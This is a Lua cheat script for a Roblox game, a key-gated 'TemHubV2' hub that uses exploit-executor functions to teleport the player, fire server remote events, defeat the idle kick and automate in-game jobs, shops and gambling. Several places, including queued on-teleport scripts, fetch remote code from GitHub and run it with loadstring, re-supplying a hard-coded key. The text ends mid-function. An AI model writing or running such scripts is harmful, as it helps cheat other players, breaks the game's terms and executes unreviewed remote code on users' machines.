banlist = { --userids
    1,
    }
admins = { --userids
    647598508,
}
    
    local plr = game.Players.LocalPlayer
    
    local runservice = game:GetService("RunService")
    local StarterGui = game:GetService("StarterGui")
    local bindable = Instance.new("BindableFunction")
    local go = false

    local cstat = "User"
    local infrizkey
    for i, user in pairs(admins) do
        if plr.UserId == user then
            cstat = "Admin"
        end
    end
    for i, user in pairs(banlist) do
        if plr.UserId == user then
            cstat = "Banned"
        end
    end

    for i, id in pairs(banlist) do
    if id == game.Players.LocalPlayer.UserId then
    go = true
    end
    end
    if go == false then
    if _G.key == "bestdabsscript" or _G.key == "adminkey" then
        infrizkey = _G.key
_G.key = "eirh2349y54893tgrbeuindoiwqhfjdb9q23934q8yt9UY"
    StarterGui:SetCore("SendNotification", {
        Title = "Credits",
        Text = "created by Forxsion#4954",
        Duration = 5,
        Callback = bindable,
    })
    
    local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
    
    local win = Flux:Window("TemTem", "DABS", Color3.fromRGB(255, 110, 48), Enum.KeyCode.LeftControl)
    
    local level1 = 4050215579
    local level3 = 4472538305
    local level4 = 4684427971
    local level5 = 5248557397
    local placeid = game.PlaceId

    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end

local Players = game:GetService("Players")

local GC = getconnections or get_signal_cons --Anti Afk
	if GC then
		for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
			if v["Disable"] then
				v["Disable"](v)
			elseif v["Disconnect"] then
				v["Disconnect"](v)
			end
		end
	else
		Players.LocalPlayer.Idled:Connect(function()
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end
    
    if placeid == level1 then
    bingo = win:Tab("Bingo", "http://www.roblox.com/asset/?id=6023426915")
    shop = win:Tab("Shop", "http://www.roblox.com/asset/?id=6023426915")
    drink = win:Tab("7/11", "http://www.roblox.com/asset/?id=6023426915")
    clean = win:Tab("Cleaning", "http://www.roblox.com/asset/?id=6023426915")
    mail = win:Tab("Mail Delivery", "http://www.roblox.com/asset/?id=6023426915")
    end
    if placeid == level3 then
        working = win:Tab("Working", "http://www.roblox.com/asset/?id=6023426915")
        lottery = win:Tab("Lottery", "http://www.roblox.com/asset/?id=6023426915")
    end
    if placeid == level4 then
        doctor = win:Tab("Doctor", "http://www.roblox.com/asset/?id=6023426915")
    end
    if placeid == level5 then
        gamble = win:Tab("Gambling", "http://www.roblox.com/asset/?id=6023426915")
    end
    other = win:Tab("Other", "http://www.roblox.com/asset/?id=6023426915")
    setting = win:Tab("Settings", "http://www.roblox.com/asset/?id=6023426915")
    
    local originaldata = {  
    autobingo = false,
    automop = false,
    autolottery = false,
    ticketnumber = 10,
    randomticket = false,
    soda = "",
    autosoda = false,
    autodrink = false,
    tpbackdrink = true,
    enablemoppoint = true,
    newppos = nil,
    autosave = true,
    getcleansolution = false,
    dailytokens = false,
    converttokens = false,
    autolaptop = false,
    autosupplies = false,
    supplytype = 3,
    removeblur = false,
    disableseats = false,
    automentos = false,
    automail = false,
    }
    if placeid == level1 then
    moptppoint = workspace.RoofP.Position + Vector3.new(0, 10, 0)
    end

    if isfile("TemHubV2/data.txt") then
        local data = game:GetService("HttpService"):JSONDecode(readfile("TemHubV2/data.txt"))
        originaldata = data
        print(originaldata)
        print(data)
        end

        local function savedata()
            if isfolder("TemHubV2") == false then
                makefolder("TemHubV2")
                end
                local datatable = originaldata
                writefile("TemHubV2/data.txt", game:GetService("HttpService"):JSONEncode(datatable))
                local data = game:GetService("HttpService"):JSONDecode(readfile("TemHubV2/data.txt"))
                print(data)
        end

        local function floorteleport(num)
            local args = {
                [1] = tonumber(num)
            }
            
            game:GetService("ReplicatedStorage").TeleportEvent:FireServer(unpack(args))
        end

        if isfile("TemHubV2/buy.txt") then
            local buytable = game:GetService("HttpService"):JSONDecode(readfile("TemHubV2/buy.txt"))
            for i, object in pairs(buytable) do
                local newobject = string.split(object, "/")[1]
                local floornum = string.split(object, "/")[2]
                for i, model in pairs(workspace:GetChildren()) do
                    if model.Name == newobject then
                        fireclickdetector(model:FindFirstChildOfClass("ClickDetector"))
                        Flux:Notification("Got "..newobject..", teleporting to floor, "..floornum, "Okay")
                                    delfile("TemHubV2/buy.txt")
                        wait(5)
                        floorteleport(floornum)
                            queueteleport([[wait(5) game.Players.LocalPlayer.PlayerGui.Menu.Enabled = false workspace.CurrentCamera.CameraType = Enum.CameraType.Custom workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.CleanBucket.Bucket.CFrame wait(1) fireproximityprompt(workspace.CleanBucket.Bucket.Attachment.ProximityPrompt) wait(3) _G.key = "adminkey" --.gg/n7fFChP5x5 changes every now and then
        loadstring(game:HttpGet("https://github.com/kittenis/temhubV2/raw/main/idkbro", true))()]]) -- script there  
                    end
                end
            end
        end
    
    if placeid == level1 then
    bingo:Button("Get bingo card", "Gives player bingo card if one isn't in inventory", function()
        local root = plr.Character.HumanoidRootPart
        local pos = root.CFrame
        root.CFrame = workspace["mr card man"].HumanoidRootPart.CFrame + Vector3.new(0, -10, 0)
        repeat runservice.RenderStepped:Wait() 
            local args = {
                [1] = 1
            }
            
            game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))   
        until plr.Backpack:FindFirstChild("BingoCard")
        root.CFrame = pos
        end)
    
        bingo:Button("Throw away card", "Throws away bingo card if player has one", function()
            local args = {
                [1] = 2
            }
            
            game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))
            end)
    
        bingo:Toggle("Auto Bingo", "Will auto get bingo card and auto check if bingo card is complete (will hide sheet ui)", originaldata["autobingo"], function(t)
            originaldata["autobingo"] = t
            coroutine.resume(coroutine.create(function()
            while originaldata["autobingo"] == true do
                local args = {
                    [1] = 1
                }
                local val = 1
                for i=1, 3 do
                    wait()
                if not plr.Backpack:FindFirstChild("BingoCard") and not plr.Character:FindFirstChild("BingoCard") then
                    plr.Character.Humanoid.Jump = true
                    wait(.5)
                    local root = plr.Character.HumanoidRootPart
                    local pos = root.CFrame
                    repeat runservice.RenderStepped:Wait() 
		        root.CFrame = workspace["mr card man"].HumanoidRootPart.CFrame + Vector3.new(0, -10, 0)
                        local args = {
                            [1] = 1
                        }
                        
                        game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))   
                    until plr.Backpack:FindFirstChild("BingoCard")
                    root.CFrame = pos
                end
                local args = {
                    [1] = val
                }
                
                game:GetService("ReplicatedStorage").BingoEvent:FireServer(unpack(args))
                val += 1
                end
                for i, ui in pairs(plr.PlayerGui:GetChildren()) do
                    if ui.Name == "Sheet" or ui.Name == "Sheet2" or ui.Name == "Sheet3" then
                        ui:Destroy()
                    end
                end
            wait()
            end
        end))
            end)

            local suptype = shop:Dropdown("Supply amount/type", {"1 (1 good)", "2 (5 goods)", "3 (20 goods)"}, function(t)
                local newt = string.split(t, " ")[1]
                originaldata["supplytype"] = tonumber(newt)
                print(newt)
                print(originaldata["supplytype"])
                end)

                if plr.attributes.SupplySold.Value >= 150 then
                suptype:Add("4 (50 goods)")
                end
			
			shop:Line()
            
            local dog2 = false
            shop:Toggle("Auto get supplies", "Will teleport to floor 3 and back to floor 1 with supplies on its way, then teleport you back to your original shop seat", originaldata["autosupplies"], function(t)
                originaldata["autosupplies"] = t
                coroutine.resume(coroutine.create(function()
                while originaldata["autosupplies"] == true do
                    if plr.attributes.SupplyShop.Value <= 0 then
                        if dog2 == false then
                            dog2 = true
                            savedata()
                            floorteleport(3)
                            queueteleport([[
                            wait(3)
                            local data = {
                                supplytype = 3
                            }
                            if isfile("TemHubV2/data.txt") then
                                data = game:GetService("HttpService"):JSONDecode(readfile("TemHubV2/data.txt"))
                                end
                            local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
                            local win = Flux:Window("TemHub", "Notifications", Color3.fromRGB(255, 110, 48), Enum.KeyCode.LeftControl)
                            wait(1)
                            Flux:Notification("Got supplies, teleporting back to level 2", "Okay")
                            local args = {
                                [1] = data["supplytype"]
                            }
                            
                            game:GetService("ReplicatedStorage").PurchaseEvent:FireServer(unpack(args))
                            local plr = game.Players.LocalPlayer
                            if not plr.PlayerGui:FindFirstChild("PurchaseSupply") then
                            game.ReplicatedStorage.PurchaseSupply:Clone().Parent = plr.PlayerGui
                            end
                            local dog = false
                            repeat wait()
                                coroutine.resume(coroutine.create(function()
                                    wait(5)
                                    if plr.PlayerGui.PurchaseSupply.Frame.TimeLeft.TextLabel.TextLabel.Timer.Value == 0 then
                                        dog = true
                                    end
                                end))
                                if dog == true then
                                    break
                                end
                            until plr.PlayerGui.PurchaseSupply.Frame.TimeLeft.TextLabel.TextLabel.Timer.Value > 0
                            local args = {
                                [1] = 1
                            }
                            
                            game:GetService("ReplicatedStorage").TeleportEvent:FireServer(unpack(args))
                            local dog = false
                                    if dog == false then
                                        dog = true
                                        local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
                                queueteleport([=[
                                    wait(7)
                                    game.Players.LocalPlayer.PlayerGui:WaitForChild("Menu").Enabled = false 
                                    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom 
                                    workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:WaitForChild("Humanoid") 
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:WaitForChild("SupplyTimerThing"):WaitForChild("Sensor1").CFrame
                                    wait(1)
                                    repeat wait()
                                    fireproximityprompt(workspace:WaitForChild("SupplyTimerThing"):WaitForChild("Sensor1"):WaitForChild("ProximityPrompt"))
                                    until game.Players.LocalPlayer.PlayerGui:FindFirstChild("GuiMessageCountdown2")
                                    wait(1)
                                    game.Players.LocalPlayer.attributes.SupplyShop.Value = 49
                                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                                    _G.key = "adminkey"
                                    loadstring(game:HttpGet("https://github.com/kittenis/temhubV2/raw/main/idkbro", true))()
                                    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("GuiMessageCountdown2") then
                                        game.Players.LocalPlayer.PlayerGui.GuiMessageCountdown2.Frame.Visible = false
                                    local StarterGui = game:GetService("StarterGui")
                                    local bindable = Instance.new("BindableFunction")
                                    StarterGui:SetCore("SendNotification", {
                                            Title = "Auto get supply",
                                            Text = "Waiting until timer is over, then will get supplies",
                                            Duration = game.Players.LocalPlayer.PlayerGui.GuiMessageCountdown2.Frame.Left.Value,
                                            Callback = bindable,
                                    })
                                    repeat wait()
                                    until game.Players.LocalPlayer.PlayerGui.GuiMessageCountdown2.Frame.Left.Value <= 0
                                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                                    game.Players.LocalPlayer.PlayerGui.GuiMessageCountdown2:Destroy()
                                    StarterGui:SetCore("SendNotification", {
                                        Title = "Auto get supply",
                                        Text = "Got supplies!",
                                        Duration = 5,
                                        Callback = bindable,
                                })
                                    wait(1)
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.SupplyTimerThing.Sensor1.CFrame
                                    wait(1)
                                    fireproximityprompt(workspace.SupplyTimerThing.Sensor1.ProximityPrompt)
                                    wait(1)
                                    repeat wait()
                                    for i,shop in pairs(workspace.Shops:GetChildren()) do
                                        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
                                            break
                                        end
                                        if shop:FindFirstChild("ShopSeat") then
                                        if not shop.ShopSeat.SeatShop:FindFirstChild("SeatWeld") then
                                            shop.ShopSeat.SeatShop:Sit(game.Players.LocalPlayer.Character.Humanoid)
                                            break
                                        end
                                    end
                                end
                            until game.Players.LocalPlayer.Character.Humanoid.Sit == true
                                    end
                                ]=])
                                end
                            ]]) -- script there
                    end
                    end
                wait()
                end
            end))
                end)
    
            local sodas = drink:Dropdown("Soda (turn off autobuy before changing)", {}, function(t)
                local newt = string.split(t, " ")[1]
                originaldata["soda"] = newt
                print(newt)
                print(originaldata["soda"])
                end)
            
                for i,sod in pairs(workspace["711Stuff"]:GetChildren()) do
                    if sod:IsA("Model") then
                        sodas:Add(sod.Price.TextLabel.Text)
                    end
                 end
    
                 drink:Toggle("Teleport back to original spot", "Teleports player back to original spot after teleporting with any option below", originaldata["tpbackdrink"], function(t)
                    originaldata["tpbackdrink"] = t
                end)
    
                 drink:Line()
    
                 drink:Button("Buy selected soda", "Will buy selected soda", function()
                    local pos = plr.Character.HumanoidRootPart.Position
                    for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
                        if object.Name == originaldata["soda"] then
                            plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
                            fireproximityprompt(object.Source.Attachment.ProximityPrompt)
                            repeat wait()
                                fireproximityprompt(object.Source.Attachment.ProximityPrompt)
                            until plr.Backpack:FindFirstChild(originaldata["soda"])
                            if originaldata["tpbackdrink"] then
                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                            end
                        end
                    end
                    end)
    
                    drink:Button("Set soda as AutoBuy", "Sets selected soda as AutoBuy after respawn", function()
                        local pos = plr.Character.HumanoidRootPart.Position
                        for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
                            if object.Name == originaldata["soda"] then
                                plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
                                fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
                                repeat wait()
                                    fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
                                until plr.PlayerGui:FindFirstChild("Message")
                                if originaldata["tpbackdrink"] then
                                plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                                end
                            end
                        end
                        end)
    
                        drink:Line()
    
                        drink:Toggle("Autobuy selected soda", "Auto buys selected soda after being removed from players inventory", originaldata["autosoda"], function(t)
                            originaldata["autosoda"] = t
                            coroutine.resume(coroutine.create(function()
                            while originaldata["autosoda"] == true do
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                            if not plr.Backpack:FindFirstChild(originaldata["soda"]) and not plr.Character:FindFirstChild(originaldata["soda"]) then
                                local pos = plr.Character.HumanoidRootPart.Position
                    for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
                        if object.Name == originaldata["soda"] then
                            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                if plr.Character.Humanoid.Health > 0 then
                            repeat wait(1)
                            until not plr.Character.Head:FindFirstChildOfClass("ParticleEmitter") or plr.Character.Humanoid.Health <= 0
                            plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
                            fireproximityprompt(object.Source.Attachment.ProximityPrompt)
                            repeat wait()
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                                fireproximityprompt(object.Source.Attachment.ProximityPrompt)
                                end
                            end
                            until plr.Backpack:FindFirstChild(originaldata["soda"]) or plr.Character.Humanoid.Health <= 0 or plr.Character:FindFirstChild(originaldata["soda"])
                            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                if plr.Character.Humanoid.Health > 0 then
                                if originaldata["tpbackdrink"] then
                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                                end
                            end
                            end
                        end
                        end
                        end
                    end
                            end
                        end
                    end
                            wait()
                            end
                        end))
                        end)
    
                        drink:Toggle("Auto drink", "Auto drinks the soda in players inventory", originaldata["autodrink"], function(t)
                            originaldata["autodrink"] = t
                            coroutine.resume(coroutine.create(function()
                            while originaldata["autodrink"] == true do
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                            if plr.Backpack:FindFirstChild(originaldata["soda"]) then
                                plr.Backpack[originaldata["soda"]].Parent = plr.Character
                            end
                            for i,tool in pairs(plr.Character:GetChildren()) do
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                                if tool:IsA("Tool") and tool.Name == originaldata["soda"] then
                                    tool:Activate()
                                end
                            end
                            end
                        end
                    end
                        end
                            wait()
                            end
                        end))
                        end)

                        drink:Line()

                        drink:Toggle("Auto mentos", "Auto uses mentos if player has it", originaldata["automentos"], function(t)
                            originaldata["automentos"] = t
                            coroutine.resume(coroutine.create(function()
                            while originaldata["automentos"] == true do
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                            if plr.Backpack:FindFirstChild("Mentos") then
                                plr.Backpack.Mentos.Parent = plr.Character
                            end
                            for i,tool in pairs(plr.Character:GetChildren()) do
                                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") then
                                    if plr.Character.Humanoid.Health > 0 then
                                if tool:IsA("Tool") and tool.Name == "Mentos" then
                                    tool:Activate()
                                end
                            end
                            end
                        end
                    end
                        end
                            wait()
                            end
                        end))
                        end)
    
        clean:Dropdown("Mopping Tool", {"Broom", "Mop"}, function(t)
        for i,tool in pairs(workspace:GetChildren()) do
            if tool.Name:lower() == t:lower() then
                print(t)
                fireclickdetector(tool:FindFirstChildOfClass("ClickDetector"))
            end
            end
        end)
    local dog = false
        clean:Toggle("Auto Mop", "Auto cleans vomit around map if it exists", originaldata["automop"], function(t)
            originaldata["automop"] = t
            coroutine.resume(coroutine.create(function()
            while originaldata["automop"] == true do
                local yes = false
            for i,vomit in pairs(workspace:GetChildren()) do
                if vomit.Name == "VomitPart" then
                    if vomit.Parent ~= nil then
                    yes = true
                    plr.Character.HumanoidRootPart.CFrame = vomit.CFrame + Vector3.new(0, 5, 0)
                    repeat wait()
                        if vomit.Parent ~= nil then
                        fireproximityprompt(vomit:FindFirstChildOfClass("ProximityPrompt"))
                        end
                    until plr.Character:FindFirstChild("MOPHATArm") or plr.Character:FindFirstChild("BROOOMHATArm") or vomit.Parent == nil
                    print("test")
                    if originaldata["enablemoppoint"] == true then
                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(moptppoint)
                    end
                    repeat wait()
                    until not plr.Character:FindFirstChild("MOPHATArm") and not plr.Character:FindFirstChild("BROOOMHATArm")
                end
            end
            end
            if yes == true then
                print(originaldata["newppos"])
                if originaldata["newppos"] ~= nil then
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(originaldata["newppos"])
                end
            end
            if originaldata["getcleansolution"] == true then
                if plr.attributes.CleanWater.Value <= 0 then
                    if dog == false then
                        dog = true
                    savedata()
                    local buytable = {
                        "Cleaning Solution/1"
                    }
                    writefile("TemHubV2/buy.txt", game:GetService("HttpService"):JSONEncode(buytable))
                    floorteleport(4)
                                queueteleport([[wait(3) _G.key = "adminkey" --.gg/n7fFChP5x5 changes every now and then
loadstring(game:HttpGet("https://github.com/kittenis/temhubV2/raw/main/idkbro", true))()]]) -- script there
                end
                end
            end
            wait()
            end
        end))
        end)

        clean:Toggle("Auto get cleaning solution", "When needed during Auto mop, the player will be teleported to level 4 and teleported back to level 1 with cleaning solution.", originaldata["getcleansolution"], function(t)
            originaldata["getcleansolution"] = t
        end)
    
        clean:Line()
    
        clean:Button("Set teleport point", "Will set the position of where the player is currently standing", function()
            originaldata["newppos"] = plr.Character.HumanoidRootPart.Position
            end)
    
            clean:Toggle("Enable teleport point", "Will teleport the player to that spot after mopping all current vomit stains (helps with not being caught)", originaldata["enablemoppoint"], function(t)
                originaldata["enablemoppoint"] = t
            end)

            mail:Button("Get Mail", "Gives player mail if one isn't in inventory", function()
                for i, box in pairs(workspace:GetChildren()) do
                    if box.Name == "Mail1" or box.Name == "Mail2" or box.Name == "Mail3" then
                        local pos = plr.Character.HumanoidRootPart.CFrame
                                if box:IsA("Model") then
                                    plr.Character.HumanoidRootPart.CFrame = box.Handle.CFrame
                                else
                                    plr.Character.HumanoidRootPart.CFrame = box.CFrame
                                end
                                task.wait(0.5)
                                fireclickdetector(box:FindFirstChildOfClass("ClickDetector"))
                                plr.Character.HumanoidRootPart.CFrame = pos
                        break
                    end
                end
                end)

                mail:Line()

                mail:Toggle("Auto deliver mail", "Auto gets mail then teleports to floor and gives mail then repeats", originaldata["automail"], function(t)
                    originaldata["automail"] = t
                    coroutine.resume(coroutine.create(function()
                    while originaldata["automail"] == true do
                        local hastool = false
                        for i, tool in pairs(plr.Backpack:GetChildren()) do
                            if tool:FindFirstChild("To") then
                                hastool = true
                            end
                        end
			for i, tool in pairs(plr.Character:GetChildren()) do
                            if tool:FindFirstChild("To") and tool:IsA("Tool") then
                                hastool = true
                            end
                        end
                        if hastool == false then
                        for i, box in pairs(workspace:GetChildren()) do
			if box ~= nil then
                            if box.Name == "Mail1" or box.Name == "Mail2" or box.Name == "Mail3" then
                                local pos = plr.Character.HumanoidRootPart.CFrame
                                if box:IsA("Model") then
                                    plr.Character.HumanoidRootPart.CFrame = box.Handle.CFrame
                                else
                                    plr.Character.HumanoidRootPart.CFrame = box.CFrame
                                end
                                task.wait(0.5)
				if box:FindFirstChildOfClass("ClickDetector") then
                                fireclickdetector(box:FindFirstChildOfClass("ClickDetector"))
                                break
				end
                            end
			    end
                        end
                    end
                        for i, part in pairs(workspace:GetChildren()) do
                        if part.Name == "Part" and part:FindFirstChildOfClass("SurfaceGui") then
                            if part:FindFirstChildOfClass("SurfaceGui"):FindFirstChildOfClass("Frame") then
                                if part:FindFirstChildOfClass("SurfaceGui"):FindFirstChildOfClass("Frame"):FindFirstChild("Level1") and part:FindFirstChildOfClass("SurfaceGui"):FindFirstChildOfClass("Frame"):FindFirstChild("Level2") then
                                    local gui = part:FindFirstChildOfClass("SurfaceGui"):FindFirstChildOfClass("Frame")
                                    for i, obje in pairs(gui:GetDescendants()) do
                                        if obje.Parent.Parent == gui then
                                            plr.Character.Humanoid:UnequipTools()
                                            for i, tool in pairs(plr.Backpack:GetChildren()) do
                                                if tool:FindFirstChild("To") then
                                                    tool.Parent = plr.Character
                                                    local val = tool.To.SurfaceGui.To.Text
                                                    if obje.Text == val then
                                                        local oldtext = obje.Parent.Text
                                                        local newlevel = tonumber(string.gsub(oldtext, "%D", ""))
                                                        if newlevel == 1 or newlevel == 2 then
                                                            for i, npc in pairs(workspace:GetChildren()) do
                                                                if npc.Name == val then
                                                                    plr.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame
                                                                    wait(.5)
                                                                    fireclickdetector(npc:FindFirstChildOfClass("ClickDetector"))
                                                                end
                                                            end
                                                        else
							   savedata()
                                                            floorteleport(newlevel)
                                                            queueteleport([[
                                                                wait(3)
                                                                local plr = game.Players.LocalPlayer
                                                                while wait() do
                                                                    if plr:FindFirstChild("Backpack") then
                                                                for i, tool in pairs(plr.Backpack:GetChildren()) do
                                                                    if tool ~= nil then
                                                                    if tool:FindFirstChild("To") then
                                                                        tool.Parent = plr.Character
                                                                        local toolname = tool.Name
                                                                        repeat wait()
                                                                        until tool.To.SurfaceGui.To.Text ~= ""
                                                                local val = tool.To.SurfaceGui.To.Text
                                                                for i, npc in pairs(workspace:GetChildren()) do
                                                                    if npc.Name == val then
                                                                        plr.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame
                                                                        wait(.5)
                                                                        repeat wait()
                                                                        fireclickdetector(npc:FindFirstChildOfClass("ClickDetector"))
                                                                        until not plr.Character:FindFirstChild(toolname)
                                                                        wait(1)
                                                                        local args = {
                                                                            [1] = 1
                                                                        }
                                                                        
                                                                        game:GetService("ReplicatedStorage").TeleportEvent:FireServer(unpack(args))
                                                                        local dog = false
                                                                                if dog == false then
                                                                                    dog = true
                                                                                    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
                                                                                    queueteleport([=[
                                                                                        wait(7)
                                                                                        game.Players.LocalPlayer.PlayerGui:WaitForChild("Menu").Enabled = false 
                                                                                        workspace.CurrentCamera.CameraType = Enum.CameraType.Custom 
                                                                                        workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid 
                                                                                        wait(1)
                                                                                        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                                                                                        _G.key = "adminkey"
                                                                                        loadstring(game:HttpGet("https://github.com/kittenis/temhubV2/raw/main/idkbro", true))()
                                                                                    ]=])
                                                                                end
                                                                    end
                                                                end
                                                                    end
                                                                end
                                                                    wait()
                                                            end
                                                                end
                                                                end
                                                            ]])
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    wait()
                    end
                end))
                    end)
    end
    
    if placeid == level3 then
        working:Label("Nothing here yet")
        lottery:Slider("Lottery ticket number", "The number your lottery ticket will be", 10, 99,originaldata["ticketnumber"],function(t)
            originaldata["ticketnumber"] = t
            end)
    
            lottery:Toggle("Random lottery ticket number", "Instead of using a set ticket number, this will pick a random number between 10-99", originaldata["randomticket"], function(t)
                originaldata["randomticket"] = t
                end)
    
                lottery:Line()
    
        lottery:Button("Get lottery ticket", "Gives player lottery ticket if one isn't in inventory", function()
            if randomticket == false then
            local args = {
                [1] = 768,
                [2] = tostring(ticketnumber)
            }
            
            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
        else
            local args = {
                [1] = 768,
                [2] = tostring(math.random(10, 99))
            }
            
            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
        end
            end)
            lottery:Button("Throw away lottery ticket", "Throws away players lottery ticket if they have one", function()
                game:GetService("ReplicatedStorage").ThrowEvent:FireServer()
                end)
    
                lottery:Line()
    
                lottery:Toggle("Auto Lottery ticket", "Will auto get lottery ticket each time it gets removed", originaldata["autolottery"], function(t)
                    originaldata["autolottery"] = t
                    coroutine.resume(coroutine.create(function()
                    while originaldata["autolottery"] == true do
                        if originaldata["randomticket"] == false then
                            local args = {
                                [1] = 768,
                                [2] = tostring(originaldata["ticketnumber"])
                            }
                            
                            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
                        else
                            local args = {
                                [1] = 768,
                                [2] = tostring(math.random(10, 99))
                            }
                            
                            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
                        end
                    wait()
                    end
                end))
                    end)
    end
    
    if placeid == level4 then
        doctor:Button("Fast Checkup", "Completes doctor checkup as fast as possible", function()
            local args = {
                [1] = 1
            }
            
            game:GetService("ReplicatedStorage").DoctorEvent:FireServer(unpack(args))
            repeat wait()
            until plr.PlayerGui:FindFirstChild("GuiMessage")
            for i, message in pairs(plr.PlayerGui:GetChildren()) do
                if message.Name == "GuiMessage" then
                    message:Destroy()
                end
            end
            fireclickdetector(workspace["intern kun man"].ClickDetector)
            repeat wait()
            until plr.PlayerGui:FindFirstChild("GuiMessage")
            fireclickdetector(workspace["other doc man"].ClickDetector)
            fireclickdetector(workspace["head doc man"].ClickDetector)
            Flux:Notification("Completed fast checkup successfully!", "Okay")
            end)
    end
    if placeid == level5 then
        gamble:Button("Use tokens", "Uses all players tokens until it hits 0", function()
            repeat wait()
                fireclickdetector(workspace.Machine:FindFirstChildOfClass("ClickDetector"))
            until plr.attributes.Token.Value <= 0
            end)

            gamble:Line()

            gamble:Toggle("Auto claim daily tokens", "Auto collects daily tokens", originaldata["dailytokens"], function(t)
                originaldata["dailytokens"] = t
                coroutine.resume(coroutine.create(function()
                while originaldata["dailytokens"] == true do
                    if plr.attributes.Token.Value <= 0 then
                        local args = {
                            [1] = "DAILY_REWARD"
                        }
                        
                        game:GetService("ReplicatedStorage").TimeRewardEvent:FireServer(unpack(args))                        
                    end
                wait()
                end
            end))
                end)

                gamble:Toggle("Auto convert tokens", "Auto converts tokens if player has enough converts", originaldata["converttokens"], function(t)
                    originaldata["converttokens"] = t
                    coroutine.resume(coroutine.create(function()
                    while originaldata["converttokens"] == true do
                        if plr.attributes.Retry.Value >= 5 then
                            game:GetService("ReplicatedStorage").ExchangeEvent:FireServer()                   
                        end
                    wait()
                    end
                end))
                    end)
    end
        
     other:Toggle("Disable Seats (dont enable this while sitting)", "Stops player from sitting in seats (good for auto mop)", originaldata["disableseats"], function(t)
        originaldata["disableseats"] = t
         for i,seat in pairs(workspace:GetDescendants()) do
            if seat:IsA("Seat") then
                seat.Disabled = originaldata["disableseats"]
            end
         end
         end)
    
    other:Dropdown("Teleport to Floor", {"1", "2", "3", "4", "5"}, function(t)
        local newnum = string.split(t, " ")[1]
        print(newnum)
       floorteleport(newnum)
        end)

        other:Line()

        other:Toggle("Auto laptop", "Auto equips laptop at all times", originaldata["autolaptop"], function(t)
            originaldata["autolaptop"] = t
            coroutine.resume(coroutine.create(function()
            while originaldata["autolaptop"] == true do
                if plr.Backpack:FindFirstChild("Laptop") then
                    plr.Backpack.Laptop.Parent = plr.Character           
                end
            wait()
            end
        end))
            end)

            other:Toggle("Auto remove blur", "Removes blur when player is sick", originaldata["removeblur"], function(t)
                originaldata["removeblur"] = t
                game.Lighting:WaitForChild("Blur").Enabled = not originaldata["removeblur"]
                end)

        setting:Button("Save data", "Saves all values to be loaded again when rejoining (gets rid of old data if it exists and replaces it)", function()
            savedata()
            end)    

            setting:Button("Delete data", "Deletes all value data", function()
                delfile("TemHubV2/data.txt")
                    end)    
        
        setting:Line()
        
        setting:Toggle("Auto save data", "Auto saves data every 5 minutes", originaldata["autosave"], function(t)
            originaldata["autosave"] = t
            coroutine.resume(coroutine.create(function()
            while originaldata["autosave"] do
                wait(300)
                savedata()
                Flux:Notification("Auto saved data successfully", "Okay")
            end
        end))
            end)

                setting:Line()
        
    setting:Button("Kill UI(S)", "Destroys all UI's using this UI Lib", function()
